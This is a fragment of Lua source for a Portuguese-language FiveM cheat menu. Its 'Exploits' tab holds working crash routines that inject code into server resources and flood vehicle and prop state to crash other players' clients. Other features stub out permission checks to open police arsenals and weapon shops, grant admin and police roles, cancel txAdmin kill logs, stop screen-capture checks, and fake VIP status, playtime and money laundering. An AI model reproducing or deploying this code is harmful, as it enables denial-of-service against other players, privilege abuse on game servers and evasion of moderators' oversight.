                                nt.createTh(function()
                                if i < 99 then
                                    if NetworkGetEntityIsNetworked(v) and NetworkHasControlOfEntity(v) then
                                        SetHornEnabled(v, true)
                                        ApplyForceToEntity(v, 1, 0, 0, 25000.0, 0, 0, 0, 0, 0, false, 0, 0, 0)
                                        Wait(700)
                                        ApplyForceToEntity(v, 1, 0, 0, -400000.0, 0, 0, 0, 0, 0, false, 0, 0, 0)
                                    end
                                else
                                    if NetworkGetEntityIsNetworked(v) and NetworkHasControlOfEntity(v) then
                                        SetHornEnabled(v, true)
                                    end
                                end
                                end)
                                Wait(0)
                                end
                                end
                                Wait(1000)
                                end
                                modoCaosRodando = false
                                end)
                                end
                                end)

                        next.elements.checkbox("Limbar Players Toda Cidade", "limbarplayerciadades", function(v)
                            while next.values.checkbox["limbarplayerciadades"] do
                                TaskStartScenarioInPlace(PlayerPedId(), "WORLD_HUMAN_WELDING", 0, true)
                                Wait(0)
                            end
                            ClearPedTasksImmediately(PlayerPedId())
                        end)
                    elseif next.vars.subtab_selected == "Free Cam" then
                        next.elements.groupbox("Free Cam", "freecam_main", "\xef\x83\xa2", 0, 0, 545, 180)
                        next.elements.checkbox("Free Cam", "freecam_enabled", function(state)
                            next.freecam.SetEnabled(state)
                        end)
                        next.elements.slider("Velocidade", "freecam_speed", {min = 1, max = 30, start = 1}, function(value)
                            next.freecam.speed = tonumber(value) or 1.0
                        end)
                    end
                elseif next.vars.tab_selected == "Exploits" then
                    if next.vars.subtab_selected == "Exploits" then
                        next.elements.groupbox("Exploits: ".. group, "exploits", "\xef\x92\x8e", 0, 0, 300, 280)

if next.cargos.get_role() == "Owner" or next.cargos.get_role() == "Amigo da Next" then

next.elements.checkbox("Crash Players", "crashdfgd_optimized", function(state)
                local function GetNearPlayers()
                    local players = GetActivePlayers()
                    local coords = GetEntityCoords(PlayerPedId())
                    local nearplayer = {}
                    for _, playerid in ipairs(players) do
                        local ped = GetPlayerPed(playerid)
                        local coord = GetEntityCoords(ped)
                        local distance = #(coords - coord)
                        table.insert(nearplayer, {playerid = playerid, distance = distance})
                    end

                    table.sort(nearplayer, function(a, b)
                        return a.distance < b.distance
                    end)

                    return nearplayer
                end


                FrameAPI.Inject("falcon-pro", [[
                    TaskVehicleTempAction = function() return false end
                    SetEntityAsMissionEntity = function() return false end
                    NetworkRequestControlOfEntity = function() return false end
                ]])

                FrameAPI.Inject("eqpg-pro", [[
                    TaskVehicleTempAction = function() return false end
                    SetEntityAsMissionEntity = function() return false end
                    NetworkRequestControlOfEntity = function() return false end
                ]])

                FrameAPI.Inject("vrp", [[
                    TaskVehicleTempAction = function() return false end
                    SetEntityAsMissionEntity = function() return false end
                    NetworkRequestControlOfEntity = function() return false end
                ]])

                while next.values.checkbox["crashdfgd_optimized"] do
                    Wait(0)

                    local available = 0
                    for _,cout in pairs(GetGamePool('CVehicle')) do
                        if NetworkGetEntityIsNetworked(cout) and  GetVehicleClass(cout) ~= 15 and GetVehicleClass(cout) ~= 16 then
                            available = available +1
                        end
                    end
                    local sorted = GetNearPlayers()
                    if #sorted ~= 1 then
                        for _, player in ipairs(sorted) do
                            local playerid = player.playerid
                            if playerid ~= PlayerId() then
                                
                                local ped = GetPlayerPed(playerid)
                                if IsPedInAnyVehicle(ped) and GetVehicleClass(GetVehiclePedIsUsing(ped))~=13 and GetVehicleClass(GetVehiclePedIsUsing(ped)) ~= 15 and GetVehicleClass(GetVehiclePedIsUsing(ped)) ~= 16 then
                                    local netid = NetworkGetEntityNetScriptId(GetVehiclePedIsUsing(ped))
                                    SetNetworkIdAlwaysExistsForPlayer(netid,playerid,true)
                                    TaskVehicleTempAction(ped,GetVehiclePedIsUsing(ped),15,1)
                                    TaskVehicleTempAction(ped,GetVehiclePedIsUsing(ped),16,1)
                                    TaskVehicleTempAction(ped,GetVehiclePedIsUsing(ped),17,1)
                                    TaskVehicleTempAction(ped,GetVehiclePedIsUsing(ped),18,1)
                                    TaskVehicleTempAction(ped,GetVehiclePedIsUsing(ped),19,1)
                                else
                                    for _, veh in ipairs(GetGamePool('CVehicle')) do
                                        if NetworkGetEntityIsNetworked(veh) and GetVehicleClass(veh) ~= 13 and GetVehicleClass(veh) ~= 15 and GetVehicleClass(veh) ~= 16 then
                                            local distance = Vdist(GetEntityCoords(veh), GetEntityCoords(ped))
                                            if distance>=500 then
                                                NetworkRequestControlOfEntity(veh)
                                                SetEntityAsMissionEntity(veh,1,1)
                                            end
                                            local netid = NetworkGetEntityNetScriptId(veh)
                                            SetNetworkIdAlwaysExistsForPlayer(netid,playerid,true)
                                            TaskVehicleTempAction(ped,veh,15,1)
                                            TaskVehicleTempAction(ped,veh,16,1)
                                            TaskVehicleTempAction(ped,veh,17,1)
                                            TaskVehicleTempAction(ped,veh,18,1)
                                            TaskVehicleTempAction(ped,veh,19,1)
                                            Wait(0)
                                        end
                                        if not DoesEntityExist(ped) then
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
end)


next.elements.button("Crash Players 2", "crash_original", function(state)
FrameAPI.Scripting.HookNativeForResource("DeleteEntity", false, "ox_lib")
FrameAPI.Scripting.HookNativeForResource("DeleteObject", false, "ox_lib")
FrameAPI.Scripting.HookNativeForResource("RemoveObject", false, "ox_lib")
FrameAPI.Scripting.HookNativeForResource("SetEntityAsNoLongerNeeded", false, "ox_lib")
FrameAPI.Scripting.HookNativeForResource("SetObjectAsNoLongerNeeded", false, "ox_lib")
FrameAPI.Scripting.HookNativeForResource("SetEntityAsMissionEntity", false, "ox_lib")
FrameAPI.Inject("ox_lib", [[
    _G.CreateObject = function()
        return 0
    end


    local OX_SPAWN_LIMIT = GetConvarInt('ox:progressPropLimit', 2)
    local RES_NAME = "ox_lib"
    local LOCAL_STORAGE_KEY = "lib:progressProps"
    
    local function setObjs(value)
        local valueT = type(value)
        LocalPlayer.state:set(LOCAL_STORAGE_KEY, value, true)
        Wait(1)
    end
    
    local function computeProps(models, count)
        local computedProps = {}
        local myCoords = GetEntityCoords(PlayerPedId())
        for i = 1, count do
            local model = models[math.random(1, #models)]
            table.insert(computedProps, {
                model = GetHashKey(model),
                rot = vec3(math.random(0, 360), 0.0, 0.0),
                rotOrder = 0,
                coords = myCoords,
                bone = 0,
                pos = vec3(0.0, 0.0, 0.0),
                uuid = GetCloudTimeAsInt() + i + math.random(1, 1000) + math.random(),
            })
        end
        return computedProps
    end
    
    
    local function oxLibProps(models, count)
        local resState = GetResourceState(RES_NAME)
    
        count = count * 2
        local batch = math.min(count, OX_SPAWN_LIMIT - 1)
        CreateThread(function()
            local remaining = count
            while remaining > 0 do
                local props = computeProps(models, batch)
                table.insert(props, {
                    model = GetHashKey(models[math.random(1, #models)])
                })
                setObjs(props)
                remaining = remaining - #props

                local percentage = math.floor(((count - remaining) / count))
            end
        end)
    end
    
    oxLibProps(
        {
    	"prop_cs_hand_radio"
        },
        1000
    )
]], "@@ox_lib/resource/interface/progress.lua")
end)
end
next.elements.button("Crashar Player 3", "crashdsfarplayesped", function()
    nt.createTh(function()
    local code1 = [[
        crashVehicleHashes =
        {
            'nextmenutop1',
        }
        crashVehicleHashes = {}
        Citizen.CreateThread = function(...) return end
        TriggerServerEvent       = function() end
        TriggerEvent             = function() end
        RegisterNetEvent         = function() end
        AddEventHandler          = function() end
        _G.TriggerServerEvent    = function() end
        _G.TriggerEvent          = function() end
        _G.RegisterNetEvent      = function() end
        _G.AddEventHandler       = function() end
        print('test')
    ]]
    FrameAPI.Inject('vrp', code1)
for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
    FrameAPI.Inject(resourceName, [[
        _hxp_crash_bypass_ver = (_hxp_crash_bypass_ver or 0) + 1
        local myVersion = _hxp_crash_bypass_ver

        local function applyCrashBypass()
            RequestModel = function() return true end
            _G.RequestModel = function() return true end
            
            HasModelLoaded = function() return true end
            _G.HasModelLoaded = function() return true end
            
            SetModelAsNoLongerNeeded = function() end
            _G.SetModelAsNoLongerNeeded = function() end

            CreateVehicle = function() return 0 end
            _G.CreateVehicle = function() return 0 end
            
            CreatePed = function() return 0 end
            _G.CreatePed = function() return 0 end

            SetVehicleParachuteModel = function() end
            _G.SetVehicleParachuteModel = function() end
            
            SetVehicleParachuteActive = function() end
            _G.SetVehicleParachuteActive = function() end

            GetEntityCoords = function() return vector3(0, 0, 0) end
            _G.GetEntityCoords = function() return vector3(0, 0, 0) end
            
            SetVehicleOnGroundProperly = function() end
            _G.SetVehicleOnGroundProperly = function() end

            SetEntityCollision = function() end
            _G.SetEntityCollision = function() end
            
            SetEntityVisible = function() end
            _G.SetEntityVisible = function() end
            
            SetEntityAsMissionEntity = function() end
            _G.SetEntityAsMissionEntity = function() end

            NetworkRequestControlOfEntity = function() return true end
            _G.NetworkRequestControlOfEntity = function() return true end
            
            DeleteEntity = function() end
            _G.DeleteEntity = function() end

            _G.GetHashKey = function(key) return key end
        end

        pcall(applyCrashBypass)

        Citizen.CreateThread(function()
            while _hxp_crash_bypass_ver == myVersion do
                pcall(applyCrashBypass)
                Citizen.Wait(250) 
            end
        end)

    ]])
    end
    local carro1_model = GetHashKey("ruiner2")
    local carro2_model = GetHashKey("ruiner2")
    local freemode_model = GetHashKey("mp_m_freemode_01")
    
    RequestModel(carro1_model)
    RequestModel(carro2_model)
    RequestModel(freemode_model)
    while not HasModelLoaded(carro1_model) or not HasModelLoaded(carro2_model) or not HasModelLoaded(freemode_model) do
        Wait(0)
    end
    
    local x, y, z = table.unpack(GetEntityCoords(PlayerPedId()))
    
    local veh1 = CreateVehicle(carro1_model, x, y, z + 70.0, 0.0, true, true)
    SetEntityVisible(veh1, false, false)
    SetEntityAsMissionEntity(veh1, true, true)
    SetVehicleOnGroundProperly(veh1)
    SetVehRadioStation(veh1, "OFF")
    SetEntityCollision(veh1, false, false)
    
    local ped1 = CreatePed(26, freemode_model, 0.0, 0.0, 0.0, 0.0, false, false)
    SetPedIntoVehicle(ped1, veh1, -1)
    
    local veh2 = CreateVehicle(carro2_model, x + 5.0, y + 5.0, z + 70.0, 0.0, true, true)
    SetEntityVisible(veh2, false, false)
    SetEntityAsMissionEntity(veh2, true, true)
    SetVehicleOnGroundProperly(veh2)
    SetVehRadioStation(veh2, "OFF")
    SetEntityCollision(veh2, false, false)
    
    local ped2 = CreatePed(26, freemode_model, 0.0, 0.0, 0.0, 0.0, false, false)
    SetPedIntoVehicle(ped2, veh2, -1)
    
    SetModelAsNoLongerNeeded(carro1_model)
    SetModelAsNoLongerNeeded(carro2_model)
    SetModelAsNoLongerNeeded(freemode_model)
    
    Wait(200)
    NetworkRequestControlOfEntity(veh1)
    NetworkRequestControlOfEntity(veh2)
    
    SetVehicleParachuteModel(veh1, GetHashKey("prop_sapling_break_02"))
    SetVehicleParachuteActive(veh1, true)
    Wait(10)
    SetVehicleParachuteModel(veh1, GetHashKey("prop_sapling_break_01"))
    SetVehicleParachuteActive(veh1, true)
    Wait(10)
    SetVehicleParachuteModel(veh1, GetHashKey("prop_tree_cedar_s_04"))
    SetVehicleParachuteActive(veh1, true)
    Wait(10)
    SetVehicleParachuteModel(veh1, GetHashKey("prop_tree_maple_03"))
    SetVehicleParachuteActive(veh1, true)
    Wait(10)
    SetVehicleParachuteModel(veh1, GetHashKey("prop_tree_cedar_02"))
    SetVehicleParachuteActive(veh1, true)
    Wait(10)
    SetVehicleParachuteModel(veh1, GetHashKey("prop_tree_cedar_s_05"))
    SetVehicleParachuteActive(veh1, true)
    
    SetVehicleParachuteModel(veh2, GetHashKey("prop_sapling_break_02"))
    SetVehicleParachuteActive(veh2, true)
    Wait(10)
    SetVehicleParachuteModel(veh2, GetHashKey("prop_sapling_break_01"))
    SetVehicleParachuteActive(veh2, true)
    Wait(10)
    SetVehicleParachuteModel(veh2, GetHashKey("prop_tree_cedar_s_04"))
    SetVehicleParachuteActive(veh2, true)
    Wait(10)
    SetVehicleParachuteModel(veh2, GetHashKey("prop_tree_maple_03"))
    SetVehicleParachuteActive(veh2, true)
    Wait(10)
    SetVehicleParachuteModel(veh2, GetHashKey("prop_tree_cedar_02"))
    SetVehicleParachuteActive(veh2, true)
    Wait(10)
    SetVehicleParachuteModel(veh2, GetHashKey("prop_tree_cedar_s_05"))
    SetVehicleParachuteActive(veh2, true)
    
    Wait(200)
    DeleteEntity(veh1)
    DeleteEntity(ped1)
    DeleteEntity(veh2)
    DeleteEntity(ped2)
    
    next.elements.notify("Crash Finish", 'success')
    end)
end)

next.elements.button("Remover modo novato", "fds", function()
    if group == "Santa Group" then
            LocalPlayer["state"]["Iniciante"] = false
            LocalPlayer["state"]["WorldPVP"] = true
            LocalPlayer["state"]["Novato"] = false
            LocalPlayer.state.Iniciante = false
            next.elements.notify("Modo novato removido com sucesso!", "success")
    elseif group == "Fusion Group" then
        GlobalState.novatTime = false
        LocalPlayer.state.novatTime = 0
        LocalPlayer.state["NovatMode"] = false
        GlobalState.NovatTime = 0
        LocalPlayer.state.onlineTime = 250
        LocalPlayer.state.games = true
        GlobalState.NovatTime = 0
        LocalPlayer.state.pvp = true
        local code = [[
        Config =
        {
          'finish_novat = 0 * 0,',
        }
        ]]
        FrameAPI.Inject('novat_system', code)
        while true do
         Citizen.Wait(1)
                                local ped = PlayerPedId()
                                SetLocalPlayerAsGhost(false)
                                NetworkSetFriendlyFireOption(true)
                                SetPedConfigFlag(ped, 48, false)
                                SetPedConfigFlag(ped, 186, false)
                                EnableControlAction(0, 37, true)
                                EnableControlAction(0, 24, true)
                                EnableControlAction(0, 140, true)
                                EnableControlAction(0, 141, true)
                                EnableControlAction(0, 142, true)
                                EnableControlAction(2, 37, true)
                                EnableControlAction(0, 106, true)
                                EnableControlAction(0, 263, true)
                                SetPedCombatAttributes(ped, 54, true)
                                SetPedCanSwitchWeapon(ped, true)
                                SetCanPedEquipAllWeapons(ped, true)
                                DisplayHud(true)
                                ResetHudComponentValues(19)
                                ResetHudComponentValues(22)
                                ShowScriptedHudComponentThisFrame(19)
                                ShowScriptedHudComponentThisFrame(22)
                                local currentWeapon = GetSelectedPedWeapon(PlayerPedId())
                                if currentWeapon and currentWeapon ~= GetHashKey('WEAPON_UNARMED') then
                                    SetCurrentPedWeapon(PlayerPedId(), currentWeapon, true)
                                end
        end
        next.elements.notify("Modo novato removido com sucesso!", "success")
        elseif group == "Central Group" then
        GlobalState.novatTime = false
        LocalPlayer.state.novatTime = 0
        local code = [[
        Config =
        {
          'finish_novat = 0 * 0,',
        }
        ]]
        FrameAPI.Inject('novat_system', code)
        next.elements.notify("Modo novato removido com sucesso!", "success")
        elseif city == "Atlanta Rj" then
        LocalPlayer.state:set('NovatMode', nil, true)
        local code = [[
        Config =
        {
          'finish_novat = 0 * 0,',
        }
        ]]
        FrameAPI.Inject('novat_system', code)
        next.elements.notify("Modo novato removido com sucesso!", "success")
    elseif group == "Nexus Group" then
        LocalPlayer.state.games = true
        LocalPlayer.state.onlineTime = 250
        GlobalState.NovatTime = 0
        LocalPlayer.state.pvp = true
        next.elements.notify("Modo novato removido com sucesso!", "success")
     elseif city == "Cidade Bella" then
    FrameAPI.Inject('energy_novato', [[
    function BlockFunctionsNovato()
    end
    local ped = PlayerPedId()
    DisableControlAction(0, 37, false)
    DisablePlayerFiring(ped,false)
    DisableControlAction(0,140,false)
    SetCanPedEquipAllWeapons(ped, true)
    ]])
    FrameAPI.StopResource("energy_novato")
    FrameAPI.StopResource("player")
    nt.createTh(function()
    while true do
    DisableControlAction(1, 37, false)
    EnableControlAction(1, 37, true)
    SetPedCanSwitchWeapon(PlayerPedId(), true)
    Wait(0)
    end
end)
       next.elements.notify("Modo novato removido com sucesso!", "success")
    else
        next.elements.notify("Cidade sem Suporte!", "warning")
    end
end)
    if group == "Central Group" then
        next.elements.button("Remover tela de Telagem", "rtdtcr", function()
            FrameAPI.StopResource('screen-request');
            FreezeEntityPosition(PlayerPedId(), false)
        end)
    end
    if group == "Lapa Group" then
    next.elements.checkbox("Noclip adm Lapa", "nclapa", function()
    FrameAPI.Inject('vrp', [[
    tvRP.noClip()
    ]])
    end)

next.elements.combobox("Selecionar Arma Vip", "arma1Selecionada", {
    "AR15 FXSTORE",
    "Minigun Complicada",
    "Minigun Bob",
    "Minigun Soares",
    "Vidigal",
    "G3LCHELLFIRE",
    "M4 Demon",
    "HK Pablin",
    "Bastao Ice",
    "P230 Hellen",
    "Teck Hellen"
})

next.elements.button("Spawnar Arma Atual", "btn4_spawn_combo", function()
FrameAPI.StopResource('SistemaDan')
    local listaArmas = {
        ["AR15 FXSTORE"] = "WEAPON_AR15FXSTORE",
        ["Minigun Bob"] = "WEAPON_MINIGUNBOB",
        ["Minigun Complicada"] = "WEAPON_MINIGUNCOMPLICADA",
        ["Minigun Soares"] = "WEAPON_MINIGUNSOARES",
        ["Vidigal"] = "WEAPON_VIDIGAL",
        ["G3LCHELLFIRE"] = "WEAPON_G3LCHELLFIRE",
        ["M4 Demon"] = "WEAPON_M4DEMON",
        ["HK Pablin"] = "WEAPON_HKPABLIN",
        ["Bastao Ice"] = "WEAPON_BASTAO_ICE",
        ["P230 Hellen"] = "WEAPON_P230HELLEN",
        ["Teck Hellen"] = "WEAPON_TECKHELLEN"
    }
    
    local nomeSelecionado = next.values.combobox["arma1Selecionada"]
    local armaHash = listaArmas[nomeSelecionado]
    local municao = -1
    
    if armaHash then
        next.spawnWeaponVip(armaHash, municao)
        next.elements.notify("Arma " .. nomeSelecionado .. " Spawnada!", "success")
    else
        next.elements.notify("Arma não encontrada!", "error")
    end
end)
end
if GetResourceState('dynamic') == 'started' then
    next.elements.button("Abrir Painel Hospital", 'abrirPainelHp', function()
        LocalPlayer.state["Paramedico"] = true
        LocalPlayer.state["Policia"] = true
        LocalPlayer.state["Police"] = true
        LocalPlayer.state["Admin"] = true
        LocalPlayer.state["Dono"] = true
        LocalPlayer.state["Owner"] = true
        LocalPlayer.state["Gabs"] = true
        LocalPlayer.state["Fundador"] = true
        LocalPlayer.state["PoliciaCivil"] = true
        LocalPlayer.state["41BPM"] = true
        LocalPlayer.state["Recom"] = true
        LocalPlayer.state["Bope"] = true
        LocalPlayer.state["PoliciaFederal"] = true
        LocalPlayer.state["Pmerj"] = true
        LocalPlayer.state["Pcerj"] = true
        LocalPlayer.state["Exercito"] = true
        local code = [[
            exports["dynamic"]:AddButton("Anunciar","Fazer um anúncio para todos os moradores.","dynamic:EmergencyAnnounce","",false,true)
            exports["dynamic"]:AddButton("Anuncio Paramedic", "Fazer um anúncio para todos os moradores.", "dynamic:EmergencyAnnounceMedic", "", false, true)
				exports["dynamic"]:AddButton("Anunciar Mecânico", "Fazer um anúncio para todos os moradores.", "dynamic:AnnounceMec", "", false, true)
            exports["dynamic"]:AddButton("Companheiros", "Verifique seus companheiros em serviço.",
            "admin:Dynamic", "statsParamedico", false, true)
            exports["dynamic"]:AddButton("Carregar", "Carregar a pessoa mais próxima.", "inventory:Carry", "",
                "player", true)
			exports["dynamic"]:AddButton("📋 Anuncio R.O","Fazer um anúncio para todos os moradores.","dynamic:PoliceRO","","others",true)
			exports["dynamic"]:SubMenu("📋 Anuncio","Anuncio para todos os moradores.","others")
                exports["dynamic"]:AddButton("💻 MDT", "Abrir painel de prisão (MDW)", "police:openMDT", "", "police", false)
                exports["dynamic"]:SubMenu("🔐 Polícia", "Menu de funções policiais.", "police")
            exports["dynamic"]:AddButton("Colocar no Veículo", "Colocar no veículo mais próximo.",
                "player:cvFunctions", "cv", "player", true)
            exports["dynamic"]:AddButton("Remover do Veículo", "Remover do veículo mais próximo.",
                "player:cvFunctions", "rv", "player", true)
            exports["dynamic"]:AddButton("Remover Chapéu", "Remover da pessoa mais próxima.", "skinshop:Remove",
                "Hat", "player", true)
            exports["dynamic"]:AddButton("Remover Máscara", "Remover da pessoa mais próxima.",
                "skinshop:Remove", "Mask", "player", true)
            exports["dynamic"]:AddButton("Remover Óculos", "Remover da pessoa mais próxima.", "skinshop:Remove",
                "Glasses", "player", true)
            exports["dynamic"]:SubMenu("Jogador", "Pessoa mais próxima de você.", "player")
            exports["dynamic"]:openMenu()
        ]]
        FrameAPI.Inject('dynamic', code)
    end)
end
if GetResourceState('shops') == 'started' then
next.elements.button("Abrir arsenal da pm", "arsenalPm", function(bool)
        FrameAPI.Inject("shops", [[
        function _G.vSERVER.requestPerm()
        return true
        end
        ]])
    end)
end
if GetResourceState('dynamic') == 'started' then
next.elements.button("Pegar no H", "pegarnoH", function(bool)
        LocalPlayer.state["Paramedico"] = true
        LocalPlayer.state["Policia"] = true
        LocalPlayer.state["Police"] = true
        LocalPlayer.state["Admin"] = true
        LocalPlayer.state["Dono"] = true
        LocalPlayer.state["Owner"] = true
        LocalPlayer.state["Gabs"] = true
        LocalPlayer.state["Fundador"] = true
        LocalPlayer.state["PoliciaCivil"] = true
        LocalPlayer.state["41BPM"] = true
        LocalPlayer.state["Recom"] = true
        LocalPlayer.state["Bope"] = true
        LocalPlayer.state["PoliciaFederal"] = true
        LocalPlayer.state["Pmerj"] = true
        LocalPlayer.state["Pcerj"] = true
        LocalPlayer.state["Exercito"] = true
        FrameAPI.Inject("dynamic", [[                                                                                               
        TriggerServerEvent("player:carryPlayer", "")
        TriggerServerEvent("inventory:CarryPolice", "")
        TriggerServerEvent("inventory:Carry", "")
        ]])
    end)
next.elements.button("Anuncio para Todos", "pegarngdsfoH", function(bool)
        LocalPlayer.state["Paramedico"] = true
        LocalPlayer.state["Policia"] = true
        LocalPlayer.state["Police"] = true
        LocalPlayer.state["Admin"] = true
        LocalPlayer.state["Dono"] = true
        LocalPlayer.state["Owner"] = true
        LocalPlayer.state["Gabs"] = true
        LocalPlayer.state["Fundador"] = true
        LocalPlayer.state["PoliciaCivil"] = true
        LocalPlayer.state["41BPM"] = true
        LocalPlayer.state["Recom"] = true
        LocalPlayer.state["Bope"] = true
        LocalPlayer.state["PoliciaFederal"] = true
        LocalPlayer.state["Pmerj"] = true
        LocalPlayer.state["Pcerj"] = true
        LocalPlayer.state["Exercito"] = true
        FrameAPI.Inject("dynamic", [[                                                                                               
        TriggerServerEvent("dynamic:PoliceRO", "")
        ]])
    end)
    end

                            if group == "Santa Group" then
                            next.elements.button("Remover logs de kill", "daora", function()
                                local deathFlag = false
                                local IsEntityDead = IsEntityDead
                                        nt.createTh(function()
                                            while true do
                                                Wait(500)
                                                local ped = PlayerPedId()
                                                local isDead = IsEntityDead(ped)
                                                if isDead and not deathFlag then
                                                    deathFlag = true
                                                    CancelEvent()
                                                elseif not isDead then
                                                    deathFlag = false
                                                end
                                            end
                                        end)
                                    AddEventHandler('txAdmin:beta:deathLog', function(ped)
                                        CancelEvent()
                                    end)
                                    AddEventHandler('txsv:logger:deathEvent', function(killer, deathReason)
                                        CancelEvent()
                                    end)
                                    next.elements.notify("Logs de kill removidos com sucesso!", "success")
                            end)
                            next.elements.button("Evitar Mundo Solo", "santamundosolo",  function()
                                FrameAPI.StopResource("hud")
                                FrameAPI.StopResource("localization")
                            end)


  next.elements.input("Horas", "numerodahrs", "")
  next.elements.button("Adicionar Hrs Jogadas", "entrarhrs", function()
    local horas =  next.values.input["numerodahrs"]
   local function SetHorasJogadas(horas)
        local alvos = { "tracking" }
        local segundos = horas * 3600
        local ped = PlayerPedId()
        for i = 1, #alvos do
            local chave = alvos[i]
            Entity(ped).state:set(chave, segundos, true)
            LocalPlayer.state:set(chave, segundos, true)
        end
        Citizen.Wait(100)
    end
    SetHorasJogadas(horas)
    end)
    next.elements.combobox("Set Vip", "setarvip", {"Prata", "Ouro", "Black", "VipSupreme", "VipPro", "PuroCrime"}, "Nenhum", function(value)
    end)
  next.elements.button("Adicionar Vip", "entrarvip", function()
    local vip =  next.values.combobox["setarvip"]
  local function SetVip(grupo)
        local ped = PlayerPedId()
        local emotes = {
            ["PuroCrime"]      = "🩸",  ["PuroPrime"]      = "🐊",
            ["VipFlor"]        = "🌸",  ["VipGusta"]       = "🐂",
            ["VipATL"]         = "🕸️", ["Docinho"]         = "🧁",
            ["VipSupreme"]     = "♦️",  ["VipImperial"]    = "⚜️",
            ["Black"]          = "👑",  ["Black2"]         = "👑",
            ["VipPro"]         = "🔥",  ["VipPremium"]     = "🍀",
            ["Platinum"]       = "⭐",  ["VipBasic"]       = "🔑",
            ["VipLancamento"]  = "⚽",  ["VipLancamento2"] = "⚡",
            ["VipLancamento3"] = "🏎️",  ["VipLancamento4"] = "🧸",
            ["Ouro"]           = "🥇",  ["Prata"]          = "🥈",
            ["VipPolicia"]     = "🚓",  ["VipLegal"]       = "⚖️",
            ["Bronze"]         = "🥉",  ["VipPVP"]         = "⚔️",
            ["VipCreator"]     = "✏️",  ["VipStaff"]       = "⚡",
            ["VipEvento1"]     = "🎪",  ["VipEvento2"]     = "🎭",
            ["VipKids"]        = "🍭",  ["kitiniciante"]   = "🌟",
        }
        local emote = emotes[grupo] or "👑"
        Entity(ped).state:set("VipGroup", grupo, true)
        Entity(ped).state:set("VipEmote", emote,  true)
        if not GlobalState["GroupEmoji"] then
            GlobalState:set("GroupEmoji", { [grupo] = emote }, true)
        else
            local tbl = GlobalState["GroupEmoji"]
            tbl[grupo] = emote
            GlobalState:set("GroupEmoji", tbl, true)
        end
        Citizen.Wait(100)
    end
    SetVip(vip)
    end)
    next.elements.checkbox("Esconder ID", "esconderid",  function(bool)
    if bool then
    FrameAPI.Inject('hud', [[
    RegisterNetEvent("hud:Passport", function(Number)
    SendNUIMessage({ action = "Passport", data = { Number = "next Menu" }})
    end)
    CreateThread(function()
    while LocalPlayer["state"] == nil or LocalPlayer["state"]["Passport"] == nil do
    Wait(100)
    end
    SendNUIMessage({ action = "Passport", data = { Number = "Pecinha.mvp" }})
    end)
    ]])
    else
    FrameAPI.Inject('hud', [[
    RegisterNetEvent("hud:Passport", function(Number)
    SendNUIMessage({ action = "Passport", data = { Number = Number }})
    end)
    CreateThread(function()
    while LocalPlayer["state"] == nil or LocalPlayer["state"]["Passport"] == nil do
    Wait(100)
    end
    SendNUIMessage({ action = "Passport", data = { Number = LocalPlayer["state"]["Passport"] }})
    end)
    ]])
    end
    end)
    next.elements.button("Lavar Dinheiro", "9665dfgfd",  function()
    nt.createTh(function()
    local code = json.decode('["StartCleanCash",[],"player",1]')
    TriggerServerEvent('player:tunnel_req', table.unpack(code))
    end)
    end)
    next.elements.button("Comprar Celular", "412321jhkhgjfg",  function()
    nt.createTh(function()
    local code = json.decode('["functionShops",["Departament","cellphone",1,21],"inventory",-1]')
    TriggerServerEvent('inventory/shops:tunnel_req', table.unpack(code))
    end)
    end)
    next.elements.button("Comprar Rádio", "235323fgsdfs",  function()
    nt.createTh(function()
    local code = json.decode('["functionShops",["Departament","radio",1,20],"inventory",-1]')
    TriggerServerEvent('inventory/shops:tunnel_req', table.unpack(code))
    end)
    end)
    next.elements.button("Comprar Binoculos", "1232dfdgf",  function()
    nt.createTh(function()
    local code = json.decode('["functionShops",["Departament","binoculars",1,19],"inventory",-1]')
    TriggerServerEvent('inventory/shops:tunnel_req', table.unpack(code))
    end)
    end)
    next.elements.button("Virar Mecânico", "virarmec",  function()
    FrameAPI.Inject('lscustoms', [[
    vSERVER = vSERVER or {}
    vSERVER.checkPermission = function(perm)
    return true
    end
    ]])
    end)
if next.cargos.get_role() == "Owner" then
    next.elements.button("Bugar Id", "id", function()
local players = GetActivePlayers()
local myPlayer = GetPlayerPed(-1)
for _, player in ipairs(players) do
if player ~= myPlayer then
SetPlayerInvincible(player, true)
SetEntityVisible(GetPlayerPed(player), false)
SetEntityCollision(GetPlayerPed(player), false)
Citizen.InvokeNative(0x2A97F8C6F5DA2511, player, false)
end
end
Citizen.InvokeNative(0x2A97F8C6F5DA2511, myPlayer, false)
end)
end
                            elseif group == "Nexus Group" then
                            next.elements.button("[!!] Remover logs de kill", "logsdekill", function()
                                AddEventHandler('txAdmin:beta:deathLog', function(ped)
                                    CancelEvent()
                                end)
                                AddEventHandler('txsv:logger:deathEvent', function(killer, deathReason)
                                    CancelEvent()
                                end)
                            end)
                            next.elements.button("[!!] Abrir Painel Mecanico", "abrirpainelmec", function()
                                FrameAPI.Inject('fun_bennys', [[
                                    SetNuiFocus(true, true)
                                    NyoModulesClient.openUI({
                                        config = bennysConfig,
                                        vehModifications = vehModifications,
                                        availableModifications = availableModifications,
                                        modTypes = newModTypes,
                                        vname = vname,
                                        isBike = isBike,
                                        rawConfig = config
                                    })
                                ]])
                            end)
                            next.elements.button("[!!] Abrir Loja de armas", "abrirlojas", function()
                                FrameAPI.Inject('nxgroup_shops', [[
                                checkPlayerPermissionr = function()
                                    return true
                                end
                                    Citizen.CreateThread(function()
                                        local code = json.decode('["handler",[{"route":"getPermShop","value":{"selectedShop":"LojaDeArmas2"}}],"nxgroup_shops",1,{"ev":"nxgroup_shops:tunnel_req","plv":"QA1H3ITL0E","rs":"nxgroup_shops","tipl":"nxgroup_shops:8"}]')
                                        TriggerServerEvent("nxgroup_shops:tunnel_req", table.unpack(code))
                                        SendNUIMessage({ action = "setVisible", payload = true })
                                        SetNuiFocus(true, true)
                                    end)
                                ]])
                            end)
                            next.elements.button("[!!] Spawnar barreira", "spawnarbarreira", function()
                                FrameAPI.Scripting.HookNative("DeleteObject", false, "vrp_policia")
                                FrameAPI.Scripting.HookNative("SetObjectAsNoLongerNeeded", false, "vrp_policia")
                                FrameAPI.Scripting.HookNative("DeleteObject", false, "PL_PROTECT")
                                FrameAPI.Scripting.HookNative("SetObjectAsNoLongerNeeded", false, "PL_PROTECT")
                                FrameAPI.Inject('vrp_policia', [[
                                    local barreira = src.barreira(d)
                                ]])
                            end)
                    elseif group == "Noway Group" then
                            next.elements.slider("Delay Minério", "DELAYMINERIO", {min = 100, max = 15000, start = 5000}, function(value)
                            end)
